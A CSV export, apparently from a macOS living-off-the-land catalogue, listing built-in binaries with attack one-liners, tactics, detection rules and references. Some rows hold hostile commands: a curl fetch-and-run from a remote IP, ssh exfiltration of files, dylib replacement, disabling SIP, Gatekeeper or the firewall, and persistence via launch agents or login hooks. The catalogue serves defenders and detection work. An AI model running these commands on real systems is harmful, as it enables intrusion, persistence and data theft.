"name","author","short_description","full_description","created","example_use_cases","example_use_cases_name","example_use_cases_description","example_use_cases_code","example_use_cases_tactics","example_use_cases_tags","paths","detections","detections_name","detections_url","resources","resources_name","resources_url","acknowledgements","is_legit"
"launchctl","Josh Carullo","Interact with LaunchAgents and LaunchDaemons.","launchctl can be used to load, start, stop, and unload macOS services. It is a command-line frontend to launchd.","2023-05-27","","[''Use launchctl to execute an application''-|-''Persistent launch agent'']","[''A oneliner that will load a plist as a LaunchAgent or LaunchDaemon, achieving persistence on a target machine. This command requires root privileges.''-|-''Creation of a persistent launch agent called with $HOME/Library/LaunchAgents/com.apple.updates.plist'']","[''sudo launchctl load /Library/LaunchAgent/com.apple.installer''-|-''launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist'']","[''Execution''-|-''Persistence''-|-''Persistence'']","[''bash''-|-''zsh''-|-''oneliner'']","/bin/launchctl","","[''LaunchAgents and LaunchDaemons must have a plist file on disk in the root, system, or user Library directory. Monitoring for plist's with executables located in /tmp or /Shared could identify suspicious applications.''-|-''Jamf Protect: Detect launchctl activity that unloads or bootsout specific service'']","[''N/A''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/launchctl_unload_and_bootout_events'']","","[''20 Common Tools & Techniques used by macOS threat Actors & Malware''-|-''Mitre Attack Technique: launchctl T1569''-|-''MITRE ATT&CK T1543.001  Create or Modify System Process: Launch Agent ''-|-''Komplex OS X Trojan (Sofacy)'']","[''https://www.sentinelone.com/labs/20-common-tools-techniques-used-by-macos-threat-actors-malware/''-|-''https://attack.mitre.org/techniques/T1569/001/''-|-''https://attack.mitre.org/techniques/T1543/001/''-|-''https://unit42.paloaltonetworks.com/unit42-sofacys-komplex-os-x-trojan/'']","","false"
"last","Will Huang (@In0de_16)","Show last user logins and TTYs.","The command shows a list of user sessions including the user name, terminal used, host name, start and stop times, and duration. It also indicates if a session is still active or was terminated unexpectedly.","2023-04-27","","[''Enumerate the users who are currently logged into the system.''-|-''Enumerate all user accounts that have logged into the system previously.''-|-''Enumerate all hosts that have remotely logged into the system before.'']","[''The following command will display sessions that are currently active.''-|-''The last command can be used to output users who have previously logged in, by specifying the tty interface 'console'.''-|-''An attacker can use 'last' with a filter to retrieve the connection date and remote host information for remote logins.'']","[''last | grep ""still logged in""''-|-''last -t console''-|-''last | grep -E '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+''']","[''Discovery''-|-''Discovery''-|-''Discovery'']","[''oneliner''-|-''account''-|-''oneliner''-|-''account''-|-''oneliner''-|-''network'']","/usr/bin/last","","System Network Connections Discovery","https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_system_network_connections_discovery.yml","","last Man Page","https://ss64.com/osx/last.html","","false"
"kextstat","Mark Morowczynsk (@markmorow)","Display the status of loaded kernal extensions (kexts)","Deprecated tool in favor of kmutil. Lists loaded kernal extensions","2023-07-30","","List kernel extensions","Uses kexstat showloaded to display kernel extensions and address in kernel memory it has been loaded","kexstat","Discovery","[''bash''-|-''zsh''-|-''kernel'']","/usr/sbin/kextstat","","No detections at time of publishing","n/a","","kextstat man page","https://ss64.com/osx/kextstat.html","","false"
"ioreg","Cedric Owens (@cedowens)","Displays a hierarchial view of the I/O Kit registry.","The I/O Kit registry (ioreg) is a useful binary that can be used to gather data such as detecting if a VM is used, getting USB device vendor names, checking if a screen is locked, etc.","2023-04-20","","[''Use ioreg to check whether the remote macOS screen is locked.''-|-''Use ioreg to check whether the host is on a physical machine or a VM''-|-''Use ioreg to check USB device vendor names''-|-''Check all ioreg properties for hypervisor names.'']","[''The following command will display a list of keys that contain ""CGSSession"". If the key ""CGSSessionScreenIsLocked"" is present, the screen is actively locked.''-|-''Check the output of this command (specifically the IOPlatformSerialNumber, board-id, and manufacturer fields) to check whether or not this host is in a virtual machine.''-|-''Grep for ""USB Vendor Name"" values to view USB vendor names. On virtualized hardware these values may contain the hypervisor name such as ""VirtualBox"". This is an additional way to check for virtualization.''-|-''Grep for ""virtual box"", ""oracle"", and ""vmware"" from the output of the ioreg -l command. This is an additional way to check for virtualization.'']","[''ioreg -n Root -d1 -a | grep CGSSession''-|-''ioreg -rd1 -c IOPlatformExpertDevice''-|-''ioreg -rd1 -c IOUSBHostDevice''-|-''ioreg -l'']","[''Discovery''-|-''Discovery''-|-''Collection''-|-''Discovery''-|-''Collection''-|-''Discovery''-|-''Collection'']","[''bash''-|-''oneliner''-|-''lockscreen''-|-''oneliner''-|-''vmcheck''-|-''oneliner''-|-''vmcheck''-|-''oneliner''-|-''vmcheck'']","/usr/sbin/ioreg","","[''System Information Discovery Using Ioreg''-|-''Jamf Protect: Ioreg used to detect if the screen is locked'']","[''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_ioreg_discovery.yml''-|-''https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/lockscreen_check'']","","[''Evasions: macOS''-|-''SwiftBelt-JXA Situational Awareness Tool'']","[''https://evasions.checkpoint.com/src/MacOS/macos.html''-|-''https://github.com/cedowens/SwiftBelt-JXA/blob/main/SwiftBelt-JXA.js#520'']","","false"
"hdiutil","Mark Morowczynsk (@markmorow)","Manipulate disk images using the DiskImages framework.","hdiutil manipulates disk images such as DMG and ISO files. You can mount, unmount, create, resize and verify disk images. Including encrypted images.","2023-05-21","","[''Mount a malicious dmg file''-|-''Mount a malicious dmg file''-|-''Mount a malicious iso file''-|-''Mount a malicious iso file''-|-''Exfiltrate data in dmg file''-|-''Exfiltrate data in encrypted dmg file'']","[''Uses hdiutil to mount a malicious dmg file to''-|-''Uses hdiutil to mount a malicious dmg file to''-|-''Uses hdiutil to mount a malicious iso file to''-|-''Uses hdiutil to mount a malicious iso file to''-|-''Uses hdiutil to create a dmg file to store exfiltrate data''-|-''Uses hdiutil to create a dmg file to store exfiltrate data'']","[''hdiutil mount malicious.dmg''-|-''hdiutil attach malicious.dmg''-|-''hdiutil mount malicious.iso''-|-''hdiutil attach malicious.iso''-|-''hdiutil create -volname ""Volume Name"" -srcfolder /path/to/folder -ov diskimage.dmg''-|-''hdiutil create -encryption -stdinpass -volname ""Volume Name"" -srcfolder /path/to/folder -ov encrypteddiskimage.dmg'']","[''Execution''-|-''Execution''-|-''Execution''-|-''Execution''-|-''Collection''-|-''Collection'']","[''bash''-|-''zsh''-|-''disk''-|-''bash''-|-''zsh''-|-''disk''-|-''bash''-|-''zsh''-|-''disk''-|-''bash''-|-''zsh''-|-''disk''-|-''bash''-|-''zsh''-|-''disk''-|-''bash''-|-''zsh''-|-''disk'']","/usr/bin/hdiutil","","[''Sigma: Disk Image Mounting Via Hdiutil''-|-''Sigma: Disk Image Creation Via Hdiutil'']","[''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_hdiutil_mount.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_hdiutil_create.yml'']","","Microsoft finds new macOS vulnerability, Shrootless, that could bypass System Integrity Protection","https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/","","false"
"dsexport","Brendan Chamberlain (@infosecB)","Export data from an Open Directory directory services server.","dsexport is a command-line utility designed to export records from the directory services database on a local host or from a connected LDAP service. The tool can be used to gather information about users, groups, and computers. The tool can also be used to export the directory services database to a file for offline analysis.","2023-05-23","","[''Export local host users''-|-''Export local host groups'']","[''Export the local host user information to a file''-|-''Export the local host group information to a file'']","[''dsexport local_users.txt /Local/Default dsRecTypeStandard:Users''-|-''dsexport local_groups.txt /Local/Default dsRecTypeStandard:Groups'']","[''Reconnaissance''-|-''Discovery''-|-''Reconnaissance''-|-''Discovery'']","[''ldap''-|-''users''-|-''ldap''-|-''groups'']","/usr/bin/dsexport","","No detections at time of publishing","N/A","","","","","false"
"dsconfigad","Ethan Nay","retrieves/changes configuration for Directory Services Active Directory Plugin.","This tool allows command-line configuration of the Active Directory Plug-in. dsconfigad has the same functionality for configuring the Active Directory plugin as the Directory Utility application. It requires ""admin"" privileges to the local workstation and to the Directory to make changes.","2023-08-23","","[''Retrieves the Active Directory configuration''-|-''Retrieves the Active Directory name'']","[''Retrieves the Active Directory configuration''-|-''Retrieves the Active Directory name'']","[''dsconfigad -show''-|-''dsconfigad -show |awk '/Active Directory Domain/{print $NF}''']","[''Discovery''-|-''Discovery'']","[''bash''-|-''zsh''-|-''bash''-|-''zsh'']","/usr/sbin/dsconfigad","","No detections at time of publishing","N/A","","[''macOS/binaries/dsconfigad''-|-''dsconfigad man page'']","[''https://macosbin.com/bin/dsconfigad''-|-''https://www.unix.com/man-page/osx/8/dsconfigad/'']","","false"
"dscl","Jonathan Bar Or (@yo_yo_yo_jbo)","Interact with Directory Services.","An extensive tool for communicating with the Directory Services, useful for Discovery.","2023-04-25","","[''Local user enumeration''-|-''Active Directory user enumeration''-|-''Local user information gathering''-|-''Active Directory user information gathering''-|-''Local group enumeration''-|-''Active Directory group enumeration''-|-''Local group information gathering''-|-''Active Directory group information gathering''-|-''Computer enumration''-|-''Share enumration''-|-''Password policy discovery''-|-''Change a user password''-|-''Local account creation'']","[''Enumerate all local users.''-|-''Enumerate all Active Directory users.''-|-''Gain useful local user information such as when their password was last set, their keyboard layout, their avatar, their home directory, UID and default shell.''-|-''Gain useful Active Directory user information such as when their password was last set, their keyboard layout, their avatar, their home directory, UID and default shell.''-|-''Enumerate all local groups.''-|-''Enumerate all Active Directory groups.''-|-''Gain useful local group information such as which users belong to that group, SMB SIDs and group ID. Especially useful for the ""admin"" group.''-|-''Gain useful Active Directory group information such as which users belong to that group, SMB SIDs and group ID. Especially useful for the ""admin"" group.''-|-''Enumerate all computers in an Active Directory.''-|-''Enumerate all shares.''-|-''Gain password policy information''-|-''Change an existing user's password.''-|-''Create a local account'']","[''dscl . -list /Users dscl . list /Users dscl . ls /Users ''-|-''dscl ""/Active Directory/TEST/All Domains"" -list /Users dscl ""/Active Directory/TEST/All Domains"" list /Users dscl ""/Active Directory/TEST/All Domains"" ls /Users ''-|-''dscl . -read /Users/$USERNAME dscl . read /Users/$USERNAME dscl . cat /Users/$USERNAME ''-|-''dscl ""/Active Directory/TEST/All Domains"" -read /Users/$USERNAME dscl ""/Active Directory/TEST/All Domains"" read /Users/$USERNAME dscl ""/Active Directory/TEST/All Domains"" cat /Users/$USERNAME ''-|-''dscl . -list /Groups dscl . list /Groups dscl . ls /Groups ''-|-''dscl ""/Active Directory/TEST/All Domains"" -list /Groups dscl ""/Active Directory/TEST/All Domains"" list /Groups dscl ""/Active Directory/TEST/All Domains"" ls /Groups ''-|-''dscl . -read /Groups/$GROUPNAME dscl . read /Groups/$GROUPNAME dscl . cat /Groups/$GROUPNAME ''-|-''dscl ""/Active Directory/TEST/All Domains"" -read /Groups/$GROUPNAME dscl ""/Active Directory/TEST/All Domains"" read /Groups/$GROUPNAME dscl ""/Active Directory/TEST/All Domains"" cat /Groups/$GROUPNAME ''-|-''dscl  ""/Active Directory/TEST/All Domains"" -list /Computers dscl  ""/Active Directory/TEST/All Domains"" list /Computers dscl  ""/Active Directory/TEST/All Domains"" ls /Computers ''-|-''dscl . -list /SharePoints dscl . list /SharePoints dscl . ls /SharePoints ''-|-''dscl . -read /Config/shadowhash dscl . read /Config/shadowhash dscl . cat /Config/shadowhash ''-|-''dscl . passwd /Users/$USERNAME oldPassword newPassword''-|-''dscl -create'']","[''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery''-|-''Persistence''-|-''Persistence'']","[''users''-|-''network''-|-''users''-|-''users''-|-''configuration''-|-''network''-|-''users''-|-''configuration''-|-''groups''-|-''network''-|-''groups''-|-''groups''-|-''configuration''-|-''network''-|-''groups''-|-''configuration''-|-''network''-|-''shares''-|-''network''-|-''shares''-|-''password''-|-''policy''-|-''password'']","/usr/bin/dscl","","Jamf Protect: Detect user account creation with dscl","https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/user_created_by_dscl","","[''MacOS Red Teaming - HackTricks''-|-''MITRE ATT&CK T1136.001 Create Account: Local Account'']","[''https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-red-teaming''-|-''https://attack.mitre.org/techniques/T1136/001/'']","","false"
"dscacheutil","Ethan Nay","gather information, statistics and initiate queries to the Directory Service cache.","dscacheutil does various operations against the Directory Service cache including gathering statistics, initiating lookups, inspection, cache flush, etc. This tool replaces most of the functionality of the lookupd tool previously available in the OS.","2023-08-23","","[''Lookup  a user''-|-''Lookup all users'']","[''List the user information''-|-''List the all users information'']","[''dscacheutil -q user -a name <USER_NAME>''-|-''dscacheutil -q user'']","[''Discovery''-|-''Discovery'']","[''bash''-|-''zsh''-|-''bash''-|-''zsh'']","/usr/bin/dscacheutil","","No detections at time of publishing","N/A","","[''macOS/binaries/dscacheutil''-|-''dscacheutil man page'']","[''https://macosbin.com/bin/dscacheutil''-|-''https://ss64.com/osx/dscacheutil.html'']","","false"
"dns-sd","Brendan Chamberlain (@infosecB)","Discover local network services using the DNS-Based Service Discovery (SD) protocol.","dns-sd can be used to interact with the Multicast DNS (mDNS) and DNS Service Discovery (DNS-SD) protocols. The tool is useful for administrators but can also be abused by malicious actors to discover local network services.","2023-05-19","","[''Discover SSH hosts''-|-''Discover web hosts''-|-''Discover hosts serving remote screen sharing''-|-''Discover hosts serving SMB'']","[''Hosts serving SSH can be discovered using the _ssh._tcp service string.''-|-''Hosts serving web services can be discovered using the _http._tcp service string.''-|-''Hosts serving remote screen sharing can be discovered using the _rfb._tcp service string.''-|-''Hosts serving SMB can be discovered using the _smb._tcp service string.'']","[''dns-sd -B _ssh._tcp''-|-''dns-sd -B _http._tcp''-|-''dns-sd -B _rfb._tcp''-|-''dns-sd -B _smb._tcp'']","[''Discovery''-|-''Discovery''-|-''Discovery''-|-''Discovery'']","[''network''-|-''network''-|-''network''-|-''network'']","/usr/bin/dns-sd","","Jamf Protect: Detect dns-sd discovery activity","https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/dns_service_discovery","","[''What does APT Activity Look Like on macOS?''-|-''mDNS / Bonjour Bible - List of Common Service Strings for various vendors'']","[''https://themittenmac.com/what-does-apt-activity-look-like-on-macos''-|-''https://jonathanmumm.com/tech-it/mdns-bonjour-bible-common-service-strings-for-various-vendors/'']","Chris Ross, Cedric Owens: Farming The Apple Orchards: Living Off The Land Techniques","false"
"ditto","Brendan Chamberlain (@infosecB)","Copy files and directories while preserving file attributes and permissions.","ditto is a command line utility that is commonly used to copy files and directories while preserving file attributes and permissions. The tool can be used by malicious actors to collect and exfiltrate sensitive data, move laterally, and/or perform DLL hijacking or binary replacement attacks.","2023-05-04","","[''Copy and compress sensitive data locally''-|-''Remove extended attributes from a file''-|-''Copy, compress, and transfer sensitive data to a remote macOS host''-|-''DLL hjiacking'']","[''The following command gathers and compresses (-c) files from the specified folder and writes them to a zip (-k) file.''-|-''ditto can be used to bypass Gatekeeper by removing the ""com.apple.quarantine"" extended attribute.''-|-''The following command gathers and compresses (-c) files from the specified folder and writes them to a zip (-k) file.''-|-''Replace a legitimate library with a malicious one while maintaining the original file permissions and attributes.'']","[''ditto -c -k --sequesterRsrc --keepParent /home/user/sensitive-files /tmp/l00t.zip''-|-''ditto -c -k unsigned.app app.zip ditto -x -k app.zip unsigned.app 2>/dev/null''-|-''ditto -c --norsrc /home/user/sensitive-files - | ssh remote_host ditto -x --norsrc - /home/user/l00t''-|-''ditto -V /path/to/malicious-library/malicious_library.dylib /path/to/target-library/original_library.dylib'']","[''Collection''-|-''Exfiltration''-|-''Collection''-|-''Exfiltration''-|-''Collection''-|-''Exfiltration''-|-''Lateral Movement''-|-''Defense Evasion''-|-''Persistence'']","[''files''-|-''compress''-|-''recursive''-|-''files''-|-''compress''-|-''recursive''-|-''files''-|-''files'']","/usr/bin/ditto","","No detection content at time of writing","N/A","","[''ditto man page''-|-''Gatekeeperâ€™s Achilles heel: Unearthing a macOS vulnerability''-|-''Jamf Threat Labs identifies Safari vulnerability allowing for Gatekeeper bypass'']","[''https://ss64.com/osx/ditto.html''-|-''https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/''-|-''https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/'']","","false"
"disown","Gabriel De Jesus (0xv1n)","Prevents a process from being terminated when a shell session or terminal is closed.","disown is a system utility that can be utilized to persist a shell process after a terminal has been closed or a shell session has been terminated. This is accomplished by preventing a SIGHUP from being sent to the running job, and removing the process from the shell jobs table. Unlike nohup which is used during process initialization, disown can be used to modify an existing process.","2025-05-27","","Start a process and remove it from the jobs table.","The following command downloads a remote binary, sets it to executable, executes the binary, disowns it from the shell it spawned from, and closes the terminal session.","curl -O http://1.1.1.1/updated && chmod +x updated && ./updated & disown && pkill Terminal","Persistence","bash","shell built-in command (bash)","","No detection content at time of writing","N/A","","[''disown man page''-|-''bash man page''-|-''Poseidon Stealer'']","[''https://linux.die.net/man/1/disown''-|-''https://man7.org/linux/man-pages/man1/bash.1.html''-|-''https://www.esentire.com/blog/poseidon-stealer-uses-sora-ai-lure-to-infect-macos'']","","false"
"defaults","Brendan Chamberlain (@infosecB)","Read, write, and delete user preference values.","The defaults binary is normally used to interact with the user defaults system, a database of macOS used to manage system settings much like the Windows Registry. The database can be abused by threat actors to change settings in attempt to evade defenses or to gain persistence.","2023-05-24","","[''Disable Gatekeeper's auto rearm functionality''-|-''Show mounted servers''-|-''Add a login item to the current user''-|-''Get Active Directory user info from Jamf Connect''-|-''Enable Firewall''-|-''Disable Firewall'']","[''The following command can be used to disable Gatekeepers rearm functionality. This command requires root privileges.''-|-''Show all mounted servers on the desktop.''-|-''An attacker can use defaults to add a login hook in attempt to gain persistence. This command requires root privileges.''-|-''Retrieve Active Directory user info from Jamf Connect defaults configuration.''-|-''Enables macOS' default firewall. This command requires root privileges.''-|-''Disables macOS' default firewall. This command requires root privileges.'']","[''sudo defaults write /Library/Preferences/com.apple.security GKAutoRearm -bool NO''-|-''defaults read com.apple.finder ""ShowMountedServersOnDesktop""''-|-''sudo defaults write /Library/Preferences/com.apple.loginwindow LoginHook gain_persistence.sh''-|-''defaults read com.jamf.connect.state''-|-''sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 1''-|-''sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 0'']","[''Defense Evasion''-|-''Discovery''-|-''Persistence''-|-''Discovery''-|-''Defense Evasion''-|-''Defense Evasion'']","[''gatekeeper''-|-''firewall''-|-''firewall'']","/usr/bin/defaults","","No detections at time of publishing","N/A","","[''macOS defaults list: Uncomplete list of macOS defaults commands with demos''-|-''Insistence on Persistence'']","[''https://macos-defaults.com/''-|-''https://www.huntress.com/blog/insistence-on-persistence'']","","false"
"csrutil","Megan Carney (https://infosec.exchange/@PwnieFan)","Configure or view system security policies.","Used to enable/disable SIP, configure netboot and authenticated-root settings","2023-05-14","","[''Disable SIP''-|-''Disable authenticated-root''-|-''Add a netboot server''-|-''Map infrastructure''-|-''Determine if SIP is enabled'']","[''disable SIP (System Integrity Protection) - requires booting into recovery mode''-|-''When authenticated-root is disabled, booting is allowed from non-sealed system snapshots - requires booting into recovery mode''-|-''Insert a new IPv4 address in the list of allowed NetBoot sources''-|-''List allowed NetBoot sources''-|-''Determine if System Integrity Protection is enabled'']","[''csrutil disable''-|-''csrutil authenticated-root disable''-|-''csrutil netboot add <address>''-|-''csrutil netboot list''-|-''csrutil status'']","[''Defense Evasion''-|-''Defense Evasion''-|-''Defense Evasion''-|-''Reconnaissance''-|-''Discovery''-|-''Discovery'']","[''users''-|-''users''-|-''configuration''-|-''configuration'']","/usr/bin/csrutil","","[''Sigma: System Integrity Protection (SIP) Disabled''-|-''Sigma: System Integrity Protection (SIP) Enumeration'']","[''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_csrutil_disable.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_csrutil_status.yml'']","","[''Discussion on how SIP interacts with bless and netboot''-|-''MITRE ATT&CK T1518.001 Software Discovery: Security Software Discovery''-|-''The XCSSET Malware: Inserts Malicious Code Into Xcode Projects, Performs UXSSBackdoor Planting in Safari, and LeveragesTwo Zero-day Exploits'']","[''https://developer.apple.com/forums/thread/4002''-|-''https://attack.mitre.org/techniques/T1518/001/''-|-''https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf'']","","false"
"codesign","Thijs Xhaflaire","Create, manipulate and verify code signatures.","The codesign command is used to create, check, and display code signatures, as well as inquire into the dynamic status of signed code in the system.","2024-07-29","","Ad-hod codesigning an app bundle","This command forcefully re-signs the MyApp.app application with an ad-hoc signature, applying the signature deeply to all nested code within the app","codesign --force --deep -s - MyApp.app","Defense Evasion","codesign","/usr/bin/codesign","","Jamf Protect: Detect ad-hod codesigning activity","https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/adhoc_codesigning","","[''When Apple Admits macOS Malware Is A Problem â€“ Itâ€™s Time To Take Notice''-|-''codesign man page'']","[''https://www.sentinelone.com/blog/when-apple-admits-macos-malware-is-a-problem-its-time-to-take-notice/''-|-''https://ss64.com/mac/codesign.html'']","","false"
"chflags","demonduck","Changes file or directory flags","The chflags utility modifies the file flags of the listed files as  specified by the flags operand.","2024-07-25","","[''Hide a file''-|-''Remove hidden flag'']","[''Add the hidden flag to a file or directory to prevent it from being  visible in Finder and Terminal.''-|-''Remove the hidden flag to a file or directory to make it visible in Finder and Terminal.'']","[''chflags hidden ~/evil''-|-''chflags nohidden ~/evil'']","[''Defense Evasion''-|-''Defense Evasion'']","[''finder''-|-''finder'']","/usr/bin/chflags","","Sigma: Hidden Flag Set On File/Directory Via Chflags","https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_chflags_hidden_flag.yml","","[''chflags man page''-|-''macOS/binaries/chflags''-|-''How to hide files and folders'']","[''https://ss64.com/mac/chflags.html''-|-''https://macosbin.com/bin/chflags''-|-''https://eclecticlight.co/2024/07/03/how-to-hide-files-and-folders/'']","","false"
"caffeinate","Ethan Nay","Prevent the system from sleeping on behalf of a utility.","caffeinate creates assertions to alter system sleep behavior.  If no assertion flags are specified, caffeinate creates an assertion to prevent idle sleep. If a utility is specified, caffeinate creates the assertions on the utility's behalf, and those assertions will persist for the duration of the utility's execution. Otherwise, caffeinate creates the assertions directly, and those assertions will persist until caffeinate exits.","2023-07-12","","[''Fork a process''-|-''Prevent a sleep'']","[''Make caffeinate fork a process and hold an assertion that prevents idle sleep as long as that process is running''-|-''Prevent a macOS from going to sleep for 4 hours (14400 seconds)'']","[''caffeinate -i /tmp/evil''-|-''caffeinate -u -t 14400'']","[''Execution''-|-''Defense Evasion''-|-''Execution'']","[''bash''-|-''zsh''-|-''bash''-|-''zsh'']","/usr/bin/caffeinate","","No detections at time of publishing","N/A","","[''macOS/binaries/caffeinate''-|-''caffeinate man page'']","[''https://macosbin.com/bin/caffeinate''-|-''https://ss64.com/osx/caffeinate.html'']","","false"
"SetFile","Chris Campbell (@texasbe2trill)","Set attributes of files and directories.","Uses the CommandLine/Terminal to set file and or directory attributes. It can set attributes, creator, creation date, modification date, and file type for multiple files at a time.","2023-04-23","","[''Set a file or directory attribute to invisible''-|-''Change a file's creation and modification timestamps'']","[''A bash or zsh oneliner can allow an attacker to set the file attribute to invisible. This action can establish persistence and evade detection for malicious files on the system.''-|-''Setfile can be used with the -d and -m arguments to alter a file's creation and modification date, respectively.'']","[''for FILE in ~/*; do echo $(SetFile -a V $FILE && echo $(GetFileInfo $FILE)) >> /tmp/fileinfo.txt; sleep 2; done''-|-''SetFile -d ""04/25/2023 11:11:00"" -m ""04/25/2023 11:12:00"" targetfile.txt'']","[''Persistence''-|-''Defense Evasion''-|-''Defense Evasion'']","[''bash''-|-''zsh''-|-''oneliner''-|-''bash''-|-''zsh''-|-''oneliner'']","/usr/bin/SetFile","","No detections at time of publishing","N/A","","The Invisible Bit","https://daringfireball.net/2008/04/the_invisible_bit","","false"
"GetFileInfo","Chris Campbell (@texasbe2trill)","Get attributes of files and directories.","Uses the CommandLine/Terminal to return type, creator, attributes, created, and modified file information of a file or directory.","2023-04-23","","Iterate through a directory to GetFileInfo","A bash or zsh oneliner can provide an attacker with information about specific files of interest.","for FILE in ~/Downloads/*; do echo $(GetFileInfo $FILE) >> fileinfo.txt; sleep 2; done","Discovery","[''bash''-|-''zsh''-|-''oneliner'']","/usr/bin/GetFileInfo","","No detections at time of publishing","N/A","","macOS/binaries/GetFileInfo","https://macosbin.com/bin/getfileinfo","","false"
